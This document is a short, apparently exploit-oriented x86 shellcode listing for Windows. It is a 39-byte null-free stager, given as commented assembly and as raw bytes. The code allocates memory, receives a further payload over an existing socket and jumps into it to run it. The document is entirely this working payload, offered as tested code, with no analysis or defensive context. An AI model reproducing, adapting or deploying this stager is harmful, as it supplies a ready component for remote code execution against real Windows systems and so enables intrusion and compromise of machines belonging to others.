________________________________________________
working assembly code, 39 bytes, nullbyte-free:
Tested to work on Windows 10 and 7.
________________________________________________

0245F9B1   33F6             XOR ESI,ESI 		;make sure registers are 0
0245F9B3   33FF             XOR EDI,EDI
0245F9B5   81EE 9AF9FFFF    SUB ESI,-666
0245F9BB   56               PUSH ESI 			;push bufsize=666 (1638 bytes)
0245F9BC   81EF 689EBFFF    SUB EDI,FFBF9E68		;find malloc string in binary
0245F9C2   FF17             CALL DWORD PTR DS:[EDI]	;call msvcrt.malloc
0245F9C4   33FF             XOR EDI,EDI			;zero out edi
0245F9C6   57               PUSH EDI			;push flags = 0
0245F9C7   8BF8             MOV EDI,EAX			;save buffer location
0245F9C9   56               PUSH ESI			;push bufsize=666
0245F9CA   50               PUSH EAX			;push buffer location
0245F9CB   53               PUSH EBX			;push current socket
0245F9CC   33F6             XOR ESI,ESI
0245F9CE   81EE 0C9EBFFF    SUB ESI,FFBF9E0C		;find recv string in binary
0245F9D4   FF16             CALL DWORD PTR DS:[ESI]	;call ws2_32.recv
0245F9D6   FFE7             JMP EDI			;jmp to our new shellcode

raw bytes:

33 F6 33 FF 81 EE 9A F9 FF FF 56 81 EF 68 9E BF FF FF 17 33 FF 57 8B F8 56 50 53 33 F6 81 EE 0C
9E BF FF FF 16 FF E7
